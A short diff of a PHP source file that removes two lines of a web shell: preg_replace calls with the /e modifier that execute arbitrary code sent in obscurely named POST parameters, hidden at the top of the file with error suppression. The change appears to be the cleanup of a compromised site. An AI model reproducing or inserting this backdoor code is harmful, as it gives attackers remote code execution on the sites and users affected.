@@ -1,6 +1,4 @@
-<?php @preg_replace('/(.*)/e', @$_POST['mduwzmdrsoufjiza'], '');
- @preg_replace('/(.*)/e', @$_POST['aqgvpzfugvr'], '');
-
+<?php
 
 /**
  * @file
